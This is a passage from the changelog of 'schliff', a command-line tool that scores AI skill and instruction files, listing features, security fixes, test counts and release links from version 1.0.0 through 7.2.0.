  switching; non-breaking for score-based consumers.
- **`install.sh` reads VERSION from `pyproject.toml`** at install time
  instead of carrying a hard-coded literal. Release process simplified
  accordingly in `RELEASING.md`.
- **EXCLUDED_DIRS centralized** in `shared.py`; `doctor` and related
  scanners share one canonical list.
- **Scorer signatures cleaned up**: unused `**kw` parameters and dead
  `ImportError` fallbacks removed from several scoring / pattern modules.
- **`verify` uses `terminal_art.score_to_grade`** instead of a local
  duplicate, keeping grade mapping in one place.

### Added

- **`RELEASING.md` pre-release checklist** documents the full release
  procedure (version bump, CHANGELOG draft, tag, publish, badge cache-bust).
- **Cross-platform CI expansion**: GitHub Actions matrix covers Python
  3.9–3.13 on ubuntu-latest and adds a dedicated `test-macos` job gating
  badge generation / report publishing.
- **~100 new regression tests** covering non-list eval-suite fields, CLI
  error-handling paths, BSD-grep portability of shipped shell scripts,
  prompt-injection sanitization, UTF edge cases, runtime enabled path,
  and `score_edges` error branches.
- **`setuptools` upper bound pinned** in `pyproject.toml` to avoid build
  breakage from future major releases; test files excluded from the wheel.

### Test coverage

- Total: 1017 → 1117 (+100) / 0 skipped / 0 failed
- New files: `test_scoring_type_guards.py`, `test_cli_error_handling.py`,
  `test_install_version.py`; expanded `test_scoring_edges_malformed.py`
  and new `test_evolve_prompt_injection.py` / `test_evolve_sanitize.py`.

## [7.1.1] - 2026-04-18

### Fixed

- **List-marker support in actionable-line patterns**: `_RE_ACTIONABLE_LINES` and three sibling patterns (`_RE_RUN_PATTERN`, `_RE_DIFF_SIGNAL`, `_RE_IMPERATIVE_INSTRUCTION`) previously only matched numbered list prefixes (`1. Run X`) or bare imperatives, silently dropping markdown bullets (`- Run X`, `* Use Y`, `+ Install Z`). A shared `_LIST_MARKER` alternation is now applied to all four. Impact on a real public CLAUDE.md (root file merged into `modelcontextprotocol/servers`): efficiency 57 → 64, composite 59.2 → 61.0.
- **10 new regression and false-positive tests** in `TestListMarkerSupport` covering supported markers, bare-imperative regression, nested indentation, word-boundary guards, and marker-without-verb cases. Full suite: 1017 passed (up from 1007).

## [7.1.0] - 2026-03-27

### Added

- **`schliff report`**: Generate Markdown quality reports with dimension breakdown, shareable via `--gist` (GitHub Gist API)
- **`schliff drift`**: Stale reference scanner — detects paths, scripts, and make targets referenced in instruction files that no longer exist on disk
- **`schliff sync`**: Cross-file instruction consistency analysis — finds contradictions, gaps, and redundancies across all instruction files in a repository
- **`schliff track`**: Score tracking over time with sparkline visualization and regression detection
- **Token budget tracking**: `schliff score --tokens` shows section-by-section token breakdown with format-specific budgets and severity levels (ok/warning/over)
- **Doctor multi-format**: `schliff doctor` now discovers and reports on CLAUDE.md, .cursorrules, AGENTS.md alongside SKILL.md, with drift analysis on all discovered files
- **Web Playground polish**: Demo file allowlist, Content-Security-Policy headers, improved vercel.json routing
- **Leaderboard scaffold**: Static leaderboard site with serverless API at web/leaderboard/ (ephemeral storage for demo phase, external storage TODO)
- 140 new tests (592 → 732 total), 4 audit iterations on core branch, 1 audit iteration each on intelligence and web branches

### Security

- Path traversal prevention in drift detector (normpath + containment check, absolute/parent path rejection)
- Control character and bidirectional override rejection in leaderboard skill_name validation
- Content-Security-Policy headers on playground and leaderboard
- Duplicate CORS header elimination (vercel.json-only, no Python-level ACAO)
- Temp file cleanup on atomic write failure in track module
- Version field length bound (max 50 chars) on leaderboard submissions

### Fixed

- Token budget severity/within_budget contradiction at exactly 100% utilization
- Doctor relpath used process cwd instead of scan_root (wrong paths when invoked from different directory)
- `find_redundancies` O(n²) performance — capped at 150 directives
- `load_history` silently returned empty list for oversized files (now salvages last 100 entries with warning)
- Config value regex captured inline comments as part of value (false conflicts)

## [7.0.0] - 2026-03-26

### Added

- **Multi-format support**: Score CLAUDE.md, .cursorrules, AGENTS.md alongside SKILL.md
  - Auto-detection from filename, `--format` override flag
  - Content normalization (synthetic frontmatter for non-SKILL.md formats)
  - Zero scorer changes — all formats normalized to SKILL.md shape before scoring
- **Security scoring dimension**: 10 regex patterns across 6 categories (injection, exfiltration, dangerous commands, obfuscation, overpermission, missing boundaries)
  - Deductive scoring (100 minus penalties), graduated composite cap
  - False-positive mitigation: code-block exclusion, meta-discourse detection (90% reduction), negation-aware matching
  - Opt-in via `--security` flag
- **`schliff compare`**: Side-by-side quality comparison of two skill files with dimension deltas
- **`schliff suggest`**: Ranked actionable fixes with estimated score impact
- **`schliff score --url`**: Score remote skill files from GitHub URLs (HTTPS-only, host allowlist, SSRF protection)
- **Web Playground**: Browser-based scorer at schliff.dev/play (serverless Python, shareable URLs)
- **GitHub Action**: Published to Marketplace with PR comments, grade output, branch protection support
- 52 new tests (540 → 592 total), 4 rounds × 6 agents security review per feature branch

### Security

- SSRF redirect protection (`_SafeRedirectHandler`)
- YAML injection prevention in content normalization
- Path traversal guard in playground API
- Shell injection prevention in action
- Content-Length malformed header guard
- JSONDecodeError handling on all JSON parse paths

## [6.3.0] - 2026-03-26

### Added

- `schliff diff <path>` command — show score delta vs. previous commit (or any `--ref`)
  - Ref validation (prevents git flag injection), path containment check, size limit guard
  - Human-readable and `--json` output formats
- CLI quick-start epilog — `schliff` without args now shows demo/score/doctor hints
- Case study: ShieldClaw (OpenClaw plugin) — 68.3 [C] → 94.6 [A] in 1 round, cross-ecosystem proof
- 85 new tests: cmd_diff (18), composite weights (33), diff scoring (34)
- README: context bridge explaining Claude Code for non-users
- README: commands table split into CLI (standalone) vs Claude Code (require integration)
- README: "Where Schliff fits" ecosystem diagram moved to Quick Start section

### Fixed

- Scoring: trigger precision/recall reported 100.0 when no predictions existed (now 0.0)
- Scoring: clarity scorer skipped ambiguous pronoun detection on first line (i==0 case)
- Scoring: efficiency scorer returned float instead of int (inconsistent with other dimensions)
- README: self-score rewording removes circular "99.0/100" claim
- README: anti-gaming section honestly frames benchmark as self-designed suite
- README: triggers description corrected from "conflicts between skills" to "eval-suite trigger accuracy"
- README: test count updated to actual 540 unit + 99 integration with links
- Security: `score_diff()` now receives resolved absolute path instead of raw user input
- Docs: stale test counts in ARCHITECTURE.md and CONTRIBUTING.md updated

## [6.2.0] - 2026-03-25

### Added

- `schliff demo` command — score a built-in bad skill to see schliff in action instantly
- `schliff badge <path>` command — generate copy-paste markdown badge for READMEs
- Pre-commit hook support (`.pre-commit-hooks.yaml`) for automatic skill quality gates
- Doctor: `--verbose` flag shows per-skill issues, `references/` extraction recommendation for large skills
- Community case study: @wan-huiyan agent-review-panel (64→85.6, 75% token reduction, A/B validated)
- 24 new tests for demo, badge, ReDoS fix, clarity injection, JSON rounding (455 total)
- Show HN launch draft (`docs/specs/show-hn-draft.md`)

### Fixed

- Security: ReDoS in `_RE_ERROR_BEHAVIOR` — bounded `[\w\s]+` to `\w[\w ]{0,80}`
- Security: OOM-safe eval-suite loading — `stat().st_size` check before `read_text()`
- Security: symlink rejection on `references/` directory and files in `estimate_token_cost`
- Scoring: `no_real_examples` silently suppressed when `code_block_pairs >= 6`
- Scoring: clarity auto-injection with custom weights — custom weights now take full precedence
- CLI: `schliff auto` reference corrected to `/schliff:auto` (Claude Code slash command)
- CLI: JSON dimension scores rounded to 1 decimal (was outputting raw floats like 92.0501...)
- CLI: badge URL encoding with `safe=""` (forward slash was not percent-encoded)
- Pre-commit: `pass_filenames: true` with file filter (was `false`, causing argparse crash)
- Removed unused `score_coherence` from public API exports
- Removed dead `SCRIPT_DIR` assignments in doctor.py and skill_mesh.py
- Fixed stale BUG DOCUMENTED comments in test_edge_cases.py

### Changed

- Quick Start: reordered to demo → doctor → score for better onboarding
- README: GIF uses absolute GitHub raw URL (fixes broken image on PyPI)
- README: Mermaid diagram section includes "view on GitHub" hint for PyPI
- PyPI metadata: added Homepage, Documentation URLs, Environment::Console classifier
- GitHub: topics reduced from 20 to 10, homepage URL set to PyPI

## [6.1.0] - 2026-03-24

### Added

- Description-aware trigger generation in init-skill (Issue #13)
- Precision/recall reporting in trigger scorer
- `schliff verify` command for CI integration (exit 0/1/2, --min-score, --regression)
- Anti-gaming benchmark with 6 synthetic skills (6/6 detected)
- Repetition detection in efficiency scorer (repeated identical lines count as noise)
- Screenshot-ready `schliff score` output with per-dimension bars and status words
- 100+ new tests (init-skill, precision/recall, verify, terminal_art, anti-gaming)
- 10 new eval-suite test cases (tc-8..tc-17) with 66 coherence-covering assertions

### Changed

- SKILL.md compressed by 13% (1676→1455 words) without information loss
- Self-score: 95.7 → 99.0/100 [S] (quality 91→99 via coherence, efficiency 88→92 via compression)

### Fixed

- Init script no longer generates Schliff-specific triggers for non-Schliff skills
- Structural markers (code fences, headers, horizontal rules) excluded from repetition count
- Code block content excluded from repetition counting (prevents false positives on examples)
- `load_last_score` handles corrupted history entries without crashing
- `run_verify` returns exit code 2 on file-not-found and scorer errors
- ANSI reset constant used consistently in terminal_art output
- 10 bugs from 5-agent security audit (shell injection, prompt injection, ReDoS guards)
- Composability handoff pattern restored (was dropped during SKILL.md compression)

## [6.0.0] - 2026-03-24

### Changed

- **Rebrand: SkillForge → Schliff** — "the finishing cut" (German: den letzten Schliff geben)
- All `/skillforge:*` commands renamed to `/schliff:*`
- All internal references, paths, demo files updated

### Added

- **Clarity as default dimension** — 7th dimension always active (5% weight, opt-out via `--no-clarity`)
- **Token cost estimation** — Doctor shows per-skill token cost + fleet total
- **GitHub Action** — `Zandereins/schliff@v6` scores skills in CI, comments on PRs
- **pip CLI** — `schliff score SKILL.md` works without Claude Code
- **Actionable Doctor** — copy-paste commands with full skill paths
- **Trigger confidence cap** — eval suites with <8 triggers capped at score 60
- **Context-aware contradictions** — "run tests" vs "run tests in production" distinguished
- **Anti-gaming headers** — empty sections don't count toward structure score
- **Signal caps** — efficiency can't be gamed with repetitive markers
- **Star badge** — GitHub stars visible in README
- **"What Schliff Fixes" table** — concrete before/after improvements
- **"Quality & Security" section** — trust signals front-loaded with "What This Means"
- **"Next Steps" CTAs** — clear paths forward for visitors
- 3 new unit tests (token estimation, context contradictions)

### Fixed

- Trigger threshold floor prevents false positives on small eval suites
- Missing dimension warnings always shown (except opt-in runtime)
- Clarity false positives on same verb with different context

### Breaking

- `--clarity` flag removed (clarity is now default; use `--no-clarity` to opt out)

## [5.1.1] - 2026-03-22

### Fixed

- Atomic file writes in text-gradient.py (prevents skill corruption on crash)
- `re.error` guard on all user-controlled regex patterns
- Path traversal validation before skill file writes
- `from __future__` placement after docstrings in 3 files
- Unguarded `terminal_art.progress_bar` import with fallback stub
- Broken all-errors guard using zip identity check
- Missing `encoding="utf-8"` on eval-suite JSON reads (4 call sites)
- Unvalidated `diff_ref` parameter in git subprocess calls
- Severity filter bypass on mesh cache hit
- `terminal_art` import before `sys.path` setup in dashboard
- Non-deterministic `hash()` replaced with `hashlib.sha256` in LSH banding
- `progress.py` loaded once instead of 3 times in report generator

## [5.1.0] - 2026-03-22

### Added

- **Honest Scoring** — "Structural Score" label everywhere, replacing misleading "Quality Score"
- **Stemming Tokenizer** — suffix-stripping replaces fixed synonym tables for better keyword matching
- **Beam Search** — top-3 exploration instead of greedy top-1 from iteration 4 onward
- **EMA Plateau Detection** — Exponential Moving Average replaces fixed-window ROI stopping
- **MinHash + LSH** — O(n) mesh analysis instead of O(n^2) for 50+ skills
- **Context-aware Patches** — generates meaningful descriptions instead of TODOs
- **Doctor Command** (`doctor.py`) — scans all installed skills, shows health summary with grades
- **Dimension Guard** — prevents patches that tank a single dimension by >15 points
- **Coherence Check** — instruction-assertion alignment as quality bonus
- **40+ Pre-compiled Regex** — performance optimization across the scorer
- **Public Cache API** — `invalidate_cache()` replaces direct `_file_cache.pop()`
- **Underscore Alias Modules** — `score_skill.py`, `text_gradient.py`, `skill_mesh.py`, `parallel_runner.py` for Python import compatibility

### Fixed

- State truncation bug in auto-improve loop
- EMA indexing off-by-one in plateau detection
- Deterministic hash for MinHash reproducibility

## [5.0.0] - 2026-03-21

### Added — The Self-Driving Engine

- **Auto-Apply** (`text-gradient.py --apply`) — deterministic patches apply themselves without LLM
- **Auto-Improve** (`auto-improve.py`) — autonomous loop driver: score → gradient → apply → keep/revert → repeat
- **Strategy Predictor** (`meta-report.py predict_best_strategy()`) — predicts P(keep) before trying
- **Runtime Scoring** (`score-skill.py --runtime`) — 7th dimension invokes Claude for behavioral validation
- **Auto-Calibration** (`meta-report.py compute_optimal_weights()`) — dimension weights from data
- **Mesh Evolution** (`skill-mesh.py generate_mesh_actions()`) — generates negative boundaries, stubs, scope fixes
- **Incremental Mesh** (`skill-mesh.py --incremental`) — content-hash caching, O(n×changed) not O(n²)
- **Episodic Memory** (`episodic-store.py`) — cross-session TF-IDF recall with auto-consolidation
- **Parallel Branching** (`parallel-runner.py`) — git worktree experiments, 3 strategies at once
- **ROI Stopping** — marginal ROI < 0.2 for 3 windows → auto-stop
- **Gap Buckets** (`progress.py`) — dimension gaps discretized for predictor input
- **Episode Emit** (`progress.py`) — auto-emit learnings to episodic store after decisions
- New subcommands: `/schliff:auto`, `/schliff:mesh-evolve`, `/schliff:predict`, `/schliff:recall`

### Changed

- Dimension weights redistributed: triggers 25%→20%, quality 25%→20%, composability 10%→5%, new runtime 15%
- `compute_composite()` auto-loads `calibrated-weights.json` when available
- Scorer test updated: 7 dimensions (6 core + runtime opt-in)

## [4.1.0] - 2026-03-21

### Fixed

- 3 critical + 4 high security issues from 4-agent code review
- CI stability with `--no-runtime-auto` in self-tests

## [3.1.0] - 2026-03-20

### Fixed

- `--since` flag now correctly scopes all 11 methods in `progress.py`
- Consistent score capping across all scoring functions

### Added

- Cost tracking: real `duration_ms`, `tokens_estimated`, `delta`, computed `status`
- 25 new integration tests (51 total)
- `explain_score_change()` wired into `--diff` output
- Security: path traversal guard, file size limit (1MB), ReDoS protection
- CHANGELOG.md, SECURITY.md, GitHub CI workflow

### Removed

- Dead code: `history/results.tsv`
- Shell expansion risk: replaced `xargs` with `sed` in `run-eval.sh`

## [3.0.0] - 2026-03-20

### Added

- Runtime evaluator — invoke Claude with test prompts
- Diff-aware scoring (`--diff` flag)
- Strategy meta-learning in `progress.py`
- Instruction clarity scorer (`--clarity` flag)
- Eval health classification
- 26-test integration suite + 12-test self-test suite

### Fixed

- 7 critical bugs found by sparring agents
- 3 assertion type mismatches
- 2 crash bugs, clarity false positives

## [2.3.0] - 2026-03-19

### Added

- Bidirectional synonym expansion, plateau guard, interaction effect detection

## [2.0.0] - 2026-03-18

### Added

- TF-IDF trigger scoring, composability analysis, 9-phase protocol
- Discovery mode, parallel experimentation, noisy metric handling

## [1.0.0] - 2026-03-17

### Added

- Initial release — 6-dimension scoring, eval runner, progress tracking

[Unreleased]: https://github.com/Zandereins/schliff/compare/v8.8.2...HEAD
[8.8.2]: https://github.com/Zandereins/schliff/compare/v8.8.1...v8.8.2
[8.8.1]: https://github.com/Zandereins/schliff/compare/v8.8.0...v8.8.1
[8.8.0]: https://github.com/Zandereins/schliff/compare/v8.7.0...v8.8.0
[8.7.0]: https://github.com/Zandereins/schliff/compare/v8.6.3...v8.7.0
[8.6.3]: https://github.com/Zandereins/schliff/compare/v8.6.2...v8.6.3
[8.6.2]: https://github.com/Zandereins/schliff/compare/v8.6.1...v8.6.2
[8.6.1]: https://github.com/Zandereins/schliff/compare/v8.6.0...v8.6.1
[8.6.0]: https://github.com/Zandereins/schliff/compare/v8.5.0...v8.6.0
[8.5.0]: https://github.com/Zandereins/schliff/compare/v8.4.0...v8.5.0
[8.4.0]: https://github.com/Zandereins/schliff/compare/v8.3.0...v8.4.0
[8.3.0]: https://github.com/Zandereins/schliff/compare/v8.2.0...v8.3.0
[8.2.0]: https://github.com/Zandereins/schliff/compare/v8.1.0...v8.2.0
[8.1.0]: https://github.com/Zandereins/schliff/compare/v8.0.0...v8.1.0
[8.0.0]: https://github.com/Zandereins/schliff/compare/v7.2.0...v8.0.0
[7.2.0]: https://github.com/Zandereins/schliff/compare/v7.1.1...v7.2.0
[7.1.1]: https://github.com/Zandereins/schliff/compare/v7.1.0...v7.1.1
[7.1.0]: https://github.com/Zandereins/schliff/compare/v7.0.0...v7.1.0
[7.0.0]: https://github.com/Zandereins/schliff/compare/v6.3.0...v7.0.0
[6.3.0]: https://github.com/Zandereins/schliff/compare/v6.2.0...v6.3.0
[6.2.0]: https://github.com/Zandereins/schliff/compare/v6.1.0...v6.2.0
[6.1.0]: https://github.com/Zandereins/schliff/compare/v6.0.0...v6.1.0
[6.0.0]: https://github.com/Zandereins/schliff/compare/v5.1.1...v6.0.0
